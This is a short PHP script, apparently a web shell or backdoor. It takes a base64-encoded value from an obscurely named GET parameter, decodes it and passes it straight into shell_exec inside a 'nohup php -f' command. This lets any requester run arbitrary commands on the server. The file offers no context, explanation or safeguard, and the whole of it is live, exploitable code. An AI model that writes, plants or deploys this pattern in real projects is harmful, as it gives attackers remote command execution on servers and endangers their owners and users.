<?php
if (!empty($_GET['command_NMMAMSDNSD'])) {
    $command = base64_decode($_GET['command_NMMAMSDNSD']);
    shell_exec('nohup php -f ' . $command);
    echo 'completed';
} else {
    echo 'Invalid';
}
